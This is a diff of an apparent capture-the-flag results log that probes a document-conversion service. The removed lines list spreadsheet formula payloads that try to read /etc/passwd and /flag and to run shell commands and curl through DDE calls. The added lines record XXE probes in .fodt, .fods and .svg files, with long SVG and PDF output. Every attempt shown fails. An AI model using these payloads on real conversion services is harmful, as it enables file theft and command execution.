@@ -1,32 +1,192 @@
 
-=== 'file:///etc/passwd'#$Sheet1.A1
-STATUS 200 BYTES 8 RESPONSE Err:540
+=== FODT_XXE xxe.fodt -> txt
+HTTP_ERROR 500 
 
+=== FODS_XXE xxe.fods -> csv
+HTTP_ERROR 500 
 
-=== T('file:///etc/passwd'#$Sheet1.A1)
-STATUS 200 BYTES 8 RESPONSE Err:540
+=== SVG_XXE_ROUNDTRIP xxe.svg -> svg
+STATUS 200 TYPE application/octet-stream BYTES 8325
+RESPONSE <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.2" width="211.67mm" height="158.75mm" viewBox="0 0 21167 15875" preserveAspectRatio="xMidYMid" fill-rule="evenodd" stroke-width="28.222" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg" xmlns:ooo="http://xml.openoffice.org/svg/export" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:presentation="http://sun.com/xmlns/staroffice/presentation" xmlns:smil="http://www.w3.org/2001/SMIL20/" xmlns:anim="urn:oasis:names:tc:opendocument:xmlns:animation:1.0" xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" xml:space="preserve">
+ <defs class="ClipPathGroup">
+  <clipPath id="presentation_clip_path" clipPathUnits="userSpaceOnUse">
+   <rect x="0" y="0" width="21167" height="15875"/>
+  </clipPath>
+  <clipPath id="presentation_clip_path_shrink" clipPathUnits="userSpaceOnUse">
+   <rect x="21" y="15" width="21125" height="15844"/>
+  </clipPath>
+ </defs>
+ <defs>
+  <font id="EmbeddedFont_1" horiz-adv-x="2048">
+   <font-face font-family="Times New Roman embedded" units-per-em="2048" font-weight="normal" font-style="normal" ascent="1826" descent="450"/>
+   <missing-glyph horiz-adv-x="2048" d="M 0,0 L 2047,0 2047,2047 0,2047 0,0 Z "/>
+   <glyph unicode="_" horiz-adv-x="1052" d="M -16,-264 L -16,-162 1040,-162 1040,-264 -16,-264 Z "/>
+   <glyph unicode="X" horiz-adv-x="1392" d="M 317,80 L 483,53 483,0 45,0 45,53 193,80 649,686 260,1262 109,1288 109,1341 662,1341 662,1288 492,1262 770,848 1081,1262 915,1288 915,1341 1354,1341 1354,1288 1206,1262 829,760 1290,80 1442,53 1442,0 889,0 889,53 1059,80 707,600 317,80 Z "/>
+   <glyph unicode="T" horiz-adv-x="1176" d="M 315,0 L 315,53 528,80 528,1255 477,1255 C 308,1255 193,1248 131,1235 L 104,1026 37,1026 37,1341 1217,1341 1217,1026 1149,1026 1122,1235 C 1102,1240 1058,1244 991,1248 924,1251 850,1253 770,1253 L 721,1253 721,80 934,53 934,0 315,0 Z "/>
+   <glyph unicode="R" horiz-adv-x="1299" d="M 424,588 L 424,80 627,53 627,0 72,0 72,53 231,80 231,1262 59,1288 59,1341 638,1341 C 806,1341 930,1313 1010,1256 1090,1199 1130,1108 1130,983 1130,894 1106,817 1057,752 1008,687 941,641 855,616 L 1218,80 1363,53 1363,0 1042,0 665,588 424,588 Z M 931,969 C 931,1071 906,1144 857,1187 807,1230 720,1251 595,1251 L 424,1251 424,678 601,678 C 720,678 805,700 856,745 906,789 931,864 931,969 Z "/>
+   <glyph unicode="O" horiz-adv-x="1306" d="M 293,672 C 293,457 329,301 401,204 473,107 586,59 739,59 892,59 1004,107 1077,204 1150,301 1186,457 1186,672 1186,886 1150,1040 1078,1135 1005,1229 892,1276 739,1276 585,1276 472,1229 401,1135 329,1040 293,886 293,672 Z M 84,672 C 84,1128 302,1356 739,1356 955,1356 1118,1298 1229,1183 1340,1067 1395,897 1395,672 1395,444 1339,272 1227,155 1115,38 952,-20 739,-20 526,-20 364,38 252,155 140,271 84,443 84,672 Z "/>
+   <glyph unicode="F" horiz-adv-x="1003" d="M 424,602 L 424,80 647,53 647,0 72,0 72,53 231,80 231,1262 59,1288 59,1341 1065,1341 1065,1020 999,1020 967,1237 C 892,1246 784,1251 643,1251 L 424,1251 424,692 819,692 850,852 911,852 911,440 850,440 819,602 424,602 Z "/>
+   <glyph unicode="E" horiz-adv-x="1086" d="M 59,53 L 231,80 231,1262 59,1288 59,1341 1065,1341 1065,1020 999,1020 967,1237 C 892,1246 784,1251 643,1251 L 424,1251 424,727 786,727 817,887 881,887 881,475 817,475 786,637 424,637 424,90 688,90 C 860,90 973,95 1026,106 L 1083,354 1149,354 1130,0 59,0 59,53 Z "/>
+   <glyph unicode="B" horiz-adv-x="1203" d="M 958,1016 C 958,1098 932,1158 881,1195 830,1232 746,1251 631,1251 L 424,1251 424,744 643,744 C 751,744 831,765 882,808 933,851 958,920 958,1016 Z M 1059,382 C 1059,476 1028,545 965,589 902,632 802,654 664,654 L 424,654 424,90 C 516,86 614,84 718,84 832,84 917,108 974,157 1031,205 1059,280 1059,382 Z M 59,0 L 59,53 231,80 231,1262 59,1288 59,1341 672,1341 C 842,1341 966,1316 1045,1266 1124,1215 1163,1135 1163,1026 1163,947 1139,880 1091,825 1042,770 974,733 887,714 1008,701 1101,666 1167,609 1233,551 1266,477 1266,386 1266,257 1222,160 1133,94 1044,27 914,-6 743,-6 L 315,0 59,0 Z "/>
+   <glyph unicode="A" horiz-adv-x="1439" d="M 461,53 L 461,0 20,0 20,53 172,80 629,1352 819,1352 1294,80 1464,53 1464,0 897,0 897,53 1077,80 944,467 416,467 281,80 461,53 Z M 676,1208 L 446,557 913,557 676,1208 Z "/>
+  </font>
+ </defs>
+ <defs class="TextShapeIndex">
+  <g ooo:slide="id1" ooo:id-list="id3"/>
+ </defs>
+ <defs class="EmbeddedBulletChars">
+  <g id="bullet-char-template-57356" transform="scale(0.00048828125,-0.00048828125)">
+   <path d="M 580,1141 L 1163,571 580,0 -4,571 580,1141 Z"/>
+  </g>
+  <g id="bullet-char-template-57354" transform="scale(0.00048828125,-0.00048828125)">
+   <path d="M 8,1128 L 1137,1128 1137,0 8,0 8,1128 Z"/>
+  </g>
+  <g id="bullet-char-template-10146" transform="scale(0.00048828125,-0.00048828125)">
+   <path d="M 174,0 L 602,739 174,1481 1456,739 174,0 Z M 1358,739 L 309,1346 659,739 1358,739 Z"/>
+  </g>
+  <g id="bullet-char-template-10132" transform="scale(0.00048828125,-0.00048828125)">
+   <path d="M 2015,739 L 1276,0 717,0 1260,543 174,543 174,936 1260,936 717,1481 1274,1481 2015,739 Z"/>
+  </g>
+  <g id="bullet-char-template-10007" transform="scale(0.00048828125,-0.00048828125)">
+   <path d="M 0,-2 C -7,14 -16,27 -25,37 L 356,567 C 262,823 215,952 215,954 215,979 228,992 255,992 264,992 276,990 289,987 310,991 331,999 354,1012 L 381,999 492,748 772,1049 836,1024 860,1049 C 881,1039 901,1025 922,1006 886,937 835,863 770,784 769,783 710,716 594,584 L 774,223 C 774,196 753,168 711,139 L 727,119 C 717,90 699,76 672,76 641,76 570,178 457,381 L 164,-76 C 142,-110 111,-127 72,-127 30,-127 9,-110 8,-76 1,-67 -2,-52 -2,-32 -2,-23 -1,-13 0,-2 Z"/>
+  </g>
+  <g id="bullet-char-template-10004" transform="scale(0.00048828125,-0.00048828125)">
+   <path d="M 285,-33 C 182,-33 111,30 74,156 52,228 41,333 41,471 41,549 55,616 82,672 116,743 169,778 240,778 293,778 328,747 346,684 L 369,508 C 377,444 397,411 428,410 L 1163,1116 C 1174,1127 1196,1133 1229,1133 1271,1133 1292,1118 1292,1087 L 1292,965 C 1292,929 1282,901 1262,881 L 442,47 C 390,-6 338,-33 285,-33 Z"/>
+  </g>
+  <g id="bullet-char-template-9679" transform="scale(0.00048828125,-0.00048828125)">
+   <path d="M 813,0 C 632,0 489,54 383,161 276,268 223,411 223,592 223,773 276,916 383,1023 489,1130 632,1184 813,1184 992,1184 1136,1130 1245,1023 1353,916 1407,772 1407,592 1407,412 1353,268 1245,161 1136,54 992,0 813,0 Z"/>
+  </g>
+  <g id="bullet-char-template-8226" transform="scale(0.00048828125,-0.00048828125)">
+   <path d="M 346,457 C 273,457 209,483 155,535 101,586 74,649 74,723 74,796 101,859 155,911 209,963 273,989 346,989 419,989 480,963 531,910 582,859 608,796 608,723 608,648 583,586 532,535 482,483 420,457 346,457 Z"/>
+  </g>
+  <g id="bullet-char-template-8211" transform="scale(0.00048828125,-0.00048828125)">
+   <path d="M -4,459 L 1135,459 1135,606 -4,606 -4,459 Z"/>
+  </g>
+  <g id="bullet-char-template-61548" transform="scale(0.00048828125,-0.00048828125)">
+   <path d="M 173,740 C 173,903 231,1043 346,1159 462,1274 601,1332 765,1332 928,1332 1067,1274 1183,1159 1299,1043 1357,903 1357,740 1357,577 1299,437 1183,322 1067,206 928,148 765,148 601,148 462,206 346,322 231,437 173,577 173,740 Z"/>
+  </g>
+ </defs>
+ <g>
+  <g id="id2" class="Master_Slide">
+   <g id="bg-id2" class="Background"/>
+   <g id="bo-id2" class="BackgroundObjects"/>
+  </g>
+ </g>
+ <g class="SlideGroup">
+  <g>
+   <g id="container-id1">
+    <g id="id1" class="Slide" clip-path="url(#presentation_clip_path)">
+     <g class="Page">
+      <g class="Graphic">
+       <g id="id3">
+        <rect class="BoundingBox" stroke="none" fill="none" x="0" y="0" width="21167" height="15875"/>
+        <text class="SVGTextShape"><tspan class="TextParagraph"><tspan class="TextPosition" x="265" y="794"><tspan font-family="Times New Roman, serif" font-size="265px" font-weight="400" fill="rgb(0,0,0)" stroke="none" style="white-space: pre">BEFORE_XXE</tspan></tspan></tspan></text>
+        <text class="SVGTextShape"><tspan class="TextParagraph"><tspan class="TextPosition" x="265" y="2381"><tspan font-family="Times New Roman, serif" font-size="265px" font-weight="400" fill="rgb(0,0,0)" stroke="none" style="white-space: pre">AFTER_XXE</tspan></tspan></tspan></text>
+       </g>
+      </g>
+     </g>
+    </g>
+   </g>
+  </g>
+ </g>
+</svg>
 
+=== FODT_XXE xxe.fodt -> txt
+HTTP_ERROR 500 
 
-=== 'file:///flag'#$Sheet1.A1
-STATUS 200 BYTES 8 RESPONSE Err:540
+=== FODS_XXE xxe.fods -> csv
+HTTP_ERROR 500 
 
+=== SVG_XXE_ROUNDTRIP xxe.svg -> svg
+STATUS 200 TYPE application/octet-stream BYTES 8325
+RESPONSE <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.2" width="211.67mm" height="158.75mm" viewBox="0 0 21167 15875" preserveAspectRatio="xMidYMid" fill-rule="evenodd" stroke-width="28.222" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg" xmlns:ooo="http://xml.openoffice.org/svg/export" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:presentation="http://sun.com/xmlns/staroffice/presentation" xmlns:smil="http://www.w3.org/2001/SMIL20/" xmlns:anim="urn:oasis:names:tc:opendocument:xmlns:animation:1.0" xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" xml:space="preserve">
+ <defs class="ClipPathGroup">
+  <clipPath id="presentation_clip_path" clipPathUnits="userSpaceOnUse">
+   <rect x="0" y="0" width="21167" height="15875"/>
+  </clipPath>
+  <clipPath id="presentation_clip_path_shrink" clipPathUnits="userSpaceOnUse">
+   <rect x="21" y="15" width="21125" height="15844"/>
+  </clipPath>
+ </defs>
+ <defs>
+  <font id="EmbeddedFont_1" horiz-adv-x="2048">
+   <font-face font-family="Times New Roman embedded" units-per-em="2048" font-weight="normal" font-style="normal" ascent="1826" descent="450"/>
+   <missing-glyph horiz-adv-x="2048" d="M 0,0 L 2047,0 2047,2047 0,2047 0,0 Z "/>
+   <glyph unicode="_" horiz-adv-x="1052" d="M -16,-264 L -16,-162 1040,-162 1040,-264 -16,-264 Z "/>
+   <glyph unicode="X" horiz-adv-x="1392" d="M 317,80 L 483,53 483,0 45,0 45,53 193,80 649,686 260,1262 109,1288 109,1341 662,1341 662,1288 492,1262 770,848 1081,1262 915,1288 915,1341 1354,1341 1354,1288 1206,1262 829,760 1290,80 1442,53 1442,0 889,0 889,53 1059,80 707,600 317,80 Z "/>
+   <glyph unicode="T" horiz-adv-x="1176" d="M 315,0 L 315,53 528,80 528,1255 477,1255 C 308,1255 193,1248 131,1235 L 104,1026 37,1026 37,1341 1217,1341 1217,1026 1149,1026 1122,1235 C 1102,1240 1058,1244 991,1248 924,1251 850,1253 770,1253 L 721,1253 721,80 934,53 934,0 315,0 Z "/>
+   <glyph unicode="R" horiz-adv-x="1299" d="M 424,588 L 424,80 627,53 627,0 72,0 72,53 231,80 231,1262 59,1288 59,1341 638,1341 C 806,1341 930,1313 1010,1256 1090,1199 1130,1108 1130,983 1130,894 1106,817 1057,752 1008,687 941,641 855,616 L 1218,80 1363,53 1363,0 1042,0 665,588 424,588 Z M 931,969 C 931,1071 906,1144 857,1187 807,1230 720,1251 595,1251 L 424,1251 424,678 601,678 C 720,678 805,700 856,745 906,789 931,864 931,969 Z "/>
+   <glyph unicode="O" horiz-adv-x="1306" d="M 293,672 C 293,457 329,301 401,204 473,107 586,59 739,59 892,59 1004,107 1077,204 1150,301 1186,457 1186,672 1186,886 1150,1040 1078,1135 1005,1229 892,1276 739,1276 585,1276 472,1229 401,1135 329,1040 293,886 293,672 Z M 84,672 C 84,1128 302,1356 739,1356 955,1356 1118,1298 1229,1183 1340,1067 1395,897 1395,672 1395,444 1339,272 1227,155 1115,38 952,-20 739,-20 526,-20 364,38 252,155 140,271 84,443 84,672 Z "/>
+   <glyph unicode="F" horiz-adv-x="1003" d="M 424,602 L 424,80 647,53 647,0 72,0 72,53 231,80 231,1262 59,1288 59,1341 1065,1341 1065,1020 999,1020 967,1237 C 892,1246 784,1251 643,1251 L 424,1251 424,692 819,692 850,852 911,852 911,440 850,440 819,602 424,602 Z "/>
+   <glyph unicode="E" horiz-adv-x="1086" d="M 59,53 L 231,80 231,1262 59,1288 59,1341 1065,1341 1065,1020 999,1020 967,1237 C 892,1246 784,1251 643,1251 L 424,1251 424,727 786,727 817,887 881,887 881,475 817,475 786,637 424,637 424,90 688,90 C 860,90 973,95 1026,106 L 1083,354 1149,354 1130,0 59,0 59,53 Z "/>
+   <glyph unicode="B" horiz-adv-x="1203" d="M 958,1016 C 958,1098 932,1158 881,1195 830,1232 746,1251 631,1251 L 424,1251 424,744 643,744 C 751,744 831,765 882,808 933,851 958,920 958,1016 Z M 1059,382 C 1059,476 1028,545 965,589 902,632 802,654 664,654 L 424,654 424,90 C 516,86 614,84 718,84 832,84 917,108 974,157 1031,205 1059,280 1059,382 Z M 59,0 L 59,53 231,80 231,1262 59,1288 59,1341 672,1341 C 842,1341 966,1316 1045,1266 1124,1215 1163,1135 1163,1026 1163,947 1139,880 1091,825 1042,770 974,733 887,714 1008,701 1101,666 1167,609 1233,551 1266,477 1266,386 1266,257 1222,160 1133,94 1044,27 914,-6 743,-6 L 315,0 59,0 Z "/>
+   <glyph unicode="A" horiz-adv-x="1439" d="M 461,53 L 461,0 20,0 20,53 172,80 629,1352 819,1352 1294,80 1464,53 1464,0 897,0 897,53 1077,80 944,467 416,467 281,80 461,53 Z M 676,1208 L 446,557 913,557 676,1208 Z "/>
+  </font>
+ </defs>
+ <defs class="TextShapeIndex">
+  <g ooo:slide="id1" ooo:id-list="id3"/>
+ </defs>
+ <defs class="EmbeddedBulletChars">
+  <g id="bullet-char-template-57356" transform="scale(0.00048828125,-0.00048828125)">
+   <path d="M 580,1141 L 1163,571 580,0 -4,571 580,1141 Z"/>
+  </g>
+  <g id="bullet-char-template-57354" transform="scale(0.00048828125,-0.00048828125)">
+   <path d="M 8,1128 L 1137,1128 1137,0 8,0 8,1128 Z"/>
+  </g>
+  <g id="bullet-char-template-10146" transform="scale(0.00048828125,-0.00048828125)">
+   <path d="M 174,0 L 602,739 174,1481 1456,739 174,0 Z M 1358,739 L 309,1346 659,739 1358,739 Z"/>
+  </g>
+  <g id="bullet-char-template-10132" transform="scale(0.00048828125,-0.00048828125)">
+   <path d="M 2015,739 L 1276,0 717,0 1260,543 174,543 174,936 1260,936 717,1481 1274,1481 2015,739 Z"/>
+  </g>
+  <g id="bullet-char-template-10007" transform="scale(0.00048828125,-0.00048828125)">
+   <path d="M 0,-2 C -7,14 -16,27 -25,37 L 356,567 C 262,823 215,952 215,954 215,979 228,992 255,992 264,992 276,990 289,987 310,991 331,999 354,1012 L 381,999 492,748 772,1049 836,1024 860,1049 C 881,1039 901,1025 922,1006 886,937 835,863 770,784 769,783 710,716 594,584 L 774,223 C 774,196 753,168 711,139 L 727,119 C 717,90 699,76 672,76 641,76 570,178 457,381 L 164,-76 C 142,-110 111,-127 72,-127 30,-127 9,-110 8,-76 1,-67 -2,-52 -2,-32 -2,-23 -1,-13 0,-2 Z"/>
+  </g>
+  <g id="bullet-char-template-10004" transform="scale(0.00048828125,-0.00048828125)">
+   <path d="M 285,-33 C 182,-33 111,30 74,156 52,228 41,333 41,471 41,549 55,616 82,672 116,743 169,778 240,778 293,778 328,747 346,684 L 369,508 C 377,444 397,411 428,410 L 1163,1116 C 1174,1127 1196,1133 1229,1133 1271,1133 1292,1118 1292,1087 L 1292,965 C 1292,929 1282,901 1262,881 L 442,47 C 390,-6 338,-33 285,-33 Z"/>
+  </g>
+  <g id="bullet-char-template-9679" transform="scale(0.00048828125,-0.00048828125)">
+   <path d="M 813,0 C 632,0 489,54 383,161 276,268 223,411 223,592 223,773 276,916 383,1023 489,1130 632,1184 813,1184 992,1184 1136,1130 1245,1023 1353,916 1407,772 1407,592 1407,412 1353,268 1245,161 1136,54 992,0 813,0 Z"/>
+  </g>
+  <g id="bullet-char-template-8226" transform="scale(0.00048828125,-0.00048828125)">
+   <path d="M 346,457 C 273,457 209,483 155,535 101,586 74,649 74,723 74,796 101,859 155,911 209,963 273,989 346,989 419,989 480,963 531,910 582,859 608,796 608,723 608,648 583,586 532,535 482,483 420,457 346,457 Z"/>
+  </g>
+  <g id="bullet-char-template-8211" transform="scale(0.00048828125,-0.00048828125)">
+   <path d="M -4,459 L 1135,459 1135,606 -4,606 -4,459 Z"/>
+  </g>
+  <g id="bullet-char-template-61548" transform="scale(0.00048828125,-0.00048828125)">
+   <path d="M 173,740 C 173,903 231,1043 346,1159 462,1274 601,1332 765,1332 928,1332 1067,1274 1183,1159 1299,1043 1357,903 1357,740 1357,577 1299,437 1183,322 1067,206 928,148 765,148 601,148 462,206 346,322 231,437 173,577 173,740 Z"/>
+  </g>
+ </defs>
+ <g>
+  <g id="id2" class="Master_Slide">
+   <g id="bg-id2" class="Background"/>
+   <g id="bo-id2" class="BackgroundObjects"/>
+  </g>
+ </g>
+ <g class="SlideGroup">
+  <g>
+   <g id="container-id1">
+    <g id="id1" class="Slide" clip-path="url(#presentation_clip_path)">
+     <g class="Page">
+      <g class="Graphic">
+       <g id="id3">
+        <rect class="BoundingBox" stroke="none" fill="none" x="0" y="0" width="21167" height="15875"/>
+        <text class="SVGTextShape"><tspan class="TextParagraph"><tspan class="TextPosition" x="265" y="794"><tspan font-family="Times New Roman, serif" font-size="265px" font-weight="400" fill="rgb(0,0,0)" stroke="none" style="white-space: pre">BEFORE_XXE</tspan></tspan></tspan></text>
+        <text class="SVGTextShape"><tspan class="TextParagraph"><tspan class="TextPosition" x="265" y="2381"><tspan font-family="Times New Roman, serif" font-size="265px" font-weight="400" fill="rgb(0,0,0)" stroke="none" style="white-space: pre">AFTER_XXE</tspan></tspan></tspan></text>
+       </g>
+      </g>
+     </g>
+    </g>
+   </g>
+  </g>
+ </g>
+</svg>
 
-=== T('file:///flag'#$Sheet1.A1)
-STATUS 200 BYTES 8 RESPONSE Err:540
-
-
-=== DDE("bash";"cat /flag";"")
-STATUS 200 BYTES 5 RESPONSE #N/A
-
-
-=== DDE("sh";"-c cat /flag";"")
-STATUS 200 BYTES 5 RESPONSE #N/A
-
-
-=== DDE("soffice";"file:///flag";"A1")
-STATUS 200 BYTES 5 RESPONSE #N/A
-
-
-=== DDE("curl";"http://webapp:8000/";"")
-STATUS 200 BYTES 5 RESPONSE #N/A
-
+=== SVG_XXE_PDF xxe.svg -> pdf
+STATUS 200 TYPE application/octet-stream BYTES 11789
+PDF_BYTES 11789 PDF_ASCII %PDF-1.7.%.........2 0 obj.<</Length 3 0 R/Filter/FlateDecode>>.stream.x.m....1...=O..7..... ....._@O.....7G....H...t._....f.R\..!XM..*..o..3....x..h.s9k.s..W......,...$.."hr....lN.mX..=.=...-.E..!.*._...".....C.....^.4..endstream.endobj..3 0 obj.149.endobj..5 0 obj.<</Length 6 0 R/Filter/FlateDecode/Length1 7208>>.stream.x..Y}pTU.?..._I'...6M..k..d;!..%..G.....!.l7.t7$..HC.rd..uP...C.QJ(.a)...af..H(.q.Y.....#C.F..ZY......=.v'......o.....;...s...+.. ...C...b...=......U.cqcn.T...0..-....%3..K.......?.....;..pv..........?.....XW....F...wo..y....'}..g..Gfm...../Y..*f.3.....c}..8.P...7.K.b..=....|..........]D..<..;.k...^...^...h............(a..sp.t.....V........Mq@...wh......M...sN.<....9........}.j.?P..Z.[..xH..]N]$Y1......I/D,s?...9.M........~t....9s...k..f./t.^..*...hK...?.]x.u...u.....y........|...J....._D.._.o.>..."...*cg&R...L.7.Mw....f..Z..Z.N..,....fi.b.!K.p/.......L.)YZO.."X.+..6A.6..K>....V......%...a..j.b.."...TMG.r.w.&M....5.0.#...U...5.5...v......ZE.q...].=.JPBh).g%....f..%.:.....Md.{...!.I...L..dw.....Z@.....vC!.P.[ ..[....p.n.g....Z.....L2w....p.v...<+.@.N.0!....L...T_'!.-nO...3zQ.....-.....u.*AX.[i/?..q..M........_......'W....f..........r..sH.p........<o.s..?..?s.$l......h.tu_......T.`!..U........C...#........Z....s.........1..s.............|1....f.%..73}.....3=2..[...c..BD....~.]k............t...S.N.....Wb7 ...(..F...@'..:ThVH.@s#..<...'.C#.<...^....B=.6.{...3...QAsE./'..,....kh=.........s.p?..,..x.!..z...x........Q.Fq.M..........)...9?..].\;}.....kT.W.W.W.W.W.^..X>C3....0<.s.n...u.u...l.r(8..R.tC.w~.;<.Ai.r0>...48<82hL...u...*<.s.s..L...g........./D_...F.a........{.5O..<p.g....n =x.@.-p..p..Q..8..=.....t,.........R.C]O.E$YD.E.l>.,..w.......~]....{...;...No9.....zz7.<......*.4T..zZ.VW..,..D#.'BJ..Vz.6.z....::.@......m|/..?...K.S<....G...4...6O[E.?..V.[..ma|ab!. P.ii...4{.+./6_i....4.........J.."...x..[\....N.Z:.U.N.).U.YaI[8.%b.n.-P.\..:......>_..!..U5....S-n.Fe.RU.S....B......{74.[...!5....]D(.. ...w@C..o..5...~.F.=.#pE_..q9..........4...4.4.......>..M...i.}Yw.830.h...li8....dq.......\....756.W......S3..{.gTVL//+.gZ...T..H.Y-.y.9&.A..x._..b.....-...r...L...4....@T.b.J.0Mnia..S...N.)6....i..MS.h*..h...\m.YR.i...\.8D..&9,.W.}?..i..#..%..+m.._.l.I...G...i...s...?'..\...9..%...\..N?..<mY:.?......M..7\^.@.......KU....Ki..u.%...&........%w...R...&y.2..j...r.Z...Et.n.Ln..>.k...uZ.Y.U].U.....G....H,......F.\..KB^.....d2 K.d4..H'V..UN............H.........h...g...{P.xYH...RO.......]^..N...@a..P..^-....XI..X.....t..J./.rQM28&)..$.1..yT.......P..K.S.w...J......V5...WN.mRME..J...]k%U7..DV...n4...1._d...Z`......F........."r Q.[|.B....D...f.._YA..(%lm.K.Z!.UQn....-....3...b.J_.Y+......OF.2[.|..C.BUz....:S.. ..);..........'...{.Z.........PwX+;.P....G..JG..]n].44;...@s'..os#.\.7T....(.8..&E+.R...a.....H.J.g.V..s...`L....J........T..Sc..7.......7....2..Rva.0jAm...3E.#.gc...X.iE/..n9,.H...ig........y6W..p..Ea./...-.j....\....l.m..cb)i.[...s9..h..T.JX.ms..@..2.....4...~E..s......+)...2mzO......C+.v4....../......l_.z.J_.;;B.p.5F...w.,....0..P...Ic4OK.1
